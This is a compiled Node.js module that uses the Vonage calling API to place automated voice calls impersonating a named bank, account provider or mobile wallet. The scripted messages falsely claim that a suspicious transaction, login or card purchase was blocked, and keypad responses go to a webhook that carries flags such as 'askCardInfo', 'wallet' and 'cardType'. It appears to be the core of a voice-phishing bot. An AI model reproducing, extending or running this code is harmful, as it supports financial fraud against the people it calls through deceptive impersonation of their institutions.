"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.vonageMakeACall = void 0;
const path_1 = __importDefault(require("path"));
const server_sdk_1 = __importDefault(require("@vonage/server-sdk"));
const vonage = new server_sdk_1.default({
    apiKey: process.env.VONAGE_API_KEY,
    apiSecret: process.env.VONAGE_API_SECRET,
    applicationId: process.env.VONAGE_APPLICATION_ID,
    privateKey: path_1.default.join(__dirname, '../../vonage_private_key.key'),
});
const nccoPrep = (institutionName, language, step, wallet, cardType, askCardInfo) => {
    switch (step) {
        case 'bank':
            return [
                {
                    action: 'talk',
                    text: `This is a call from ${institutionName.toUpperCase()} fraud prevention line. We have BLOCKED a recent SUSPICIOUS transaction on your account. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
                    style: 2,
                    language,
                    bargeIn: true,
                },
                {
                    eventUrl: [
                        `${process.env.ENDPOINT_URL}/vonage-webhook/dtmf/${language}/${step}`,
                    ],
                    action: 'input',
                    type: ['dtmf'],
                    dtmf: {
                        timeOut: 10,
                        maxDigits: 1,
                    },
                },
            ];
        case 'account':
            return [
                {
                    action: 'talk',
                    text: `This is a call from ${institutionName.toUpperCase()} account security line. We have BLOCKED a recent SUSPICIOUS login attempt on your account. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
                    style: 2,
                    language,
                    bargeIn: true,
                },
                {
                    eventUrl: [
                        `${process.env.ENDPOINT_URL}/vonage-webhook/dtmf/${language}/${step}?askCardInfo=${askCardInfo}`,
                    ],
                    action: 'input',
                    type: ['dtmf'],
                    dtmf: {
                        timeOut: 10,
                        maxDigits: 1,
                    },
                },
            ];
        case 'pay':
            return [
                {
                    action: 'talk',
                    text: `This is a call from ${institutionName.toUpperCase()} mobile wallet line. We have BLOCKED a recent SUSPICIOUS ${wallet} purchase. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
                    style: 2,
                    language,
                    bargeIn: true,
                },
                {
                    eventUrl: [
                        `${process.env.ENDPOINT_URL}/vonage-webhook/dtmf/${language}/${step}?wallet=${wallet === null || wallet === void 0 ? void 0 : wallet.replace(/\s/g, '').toLowerCase()}`,
                    ],
                    action: 'input',
                    type: ['dtmf'],
                    dtmf: {
                        timeOut: 10,
                        maxDigits: 1,
                    },
                },
            ];
        case 'card':
            return [
                {
                    action: 'talk',
                    text: `This is a call from ${institutionName.toUpperCase()} fraud prevention line. We have BLOCKED a recent SUSPICIOUS online purchase, your ${cardType} card details was used. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
                    style: 2,
                    language,
                    bargeIn: true,
                },
                {
                    eventUrl: [
                        `${process.env.ENDPOINT_URL}/vonage-webhook/dtmf/${language}/${step}?cardType=${cardType}`,
                    ],
                    action: 'input',
                    type: ['dtmf'],
                    dtmf: {
                        timeOut: 10,
                        maxDigits: 1,
                    },
                },
            ];
        default:
            break;
    }
};
const vonageMakeACall = ({ institutionName, to, from, step, wallet, cardType, askCardInfo, }) => {
    const ncco = /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|#)\d{3,4})?$/g.test(to)
        ? nccoPrep(institutionName, 'en-GB', step, wallet, cardType, askCardInfo)
        : nccoPrep(institutionName, 'en-US', step, wallet, cardType, askCardInfo);
    return vonage.calls.create({
        to: [
            {
                type: 'phone',
                number: to,
            },
        ],
        from: {
            type: 'phone',
            number: from,
        },
        ncco,
        webhook: {
            url: `${process.env.ENDPOINT_URL}//vonage-webhook`,
            token: process.env.MESSAGEBIRD_TOKEN,
        },
    }, (error, response) => {
        if (error)
            console.error('error: ', error);
        if (response)
            console.log('response: ', response);
    });
};
exports.vonageMakeACall = vonageMakeACall;
